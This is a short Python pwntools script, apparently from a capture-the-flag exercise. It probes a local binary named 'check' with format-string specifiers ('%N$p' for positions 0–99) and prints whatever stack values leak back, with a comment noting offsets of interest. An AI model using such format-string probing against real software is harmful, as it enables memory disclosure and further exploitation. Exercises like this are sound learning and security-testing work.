from pwn import *

# 23 24 29

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./check', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        p.sendline('%{}$p'.format(i).encode())
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
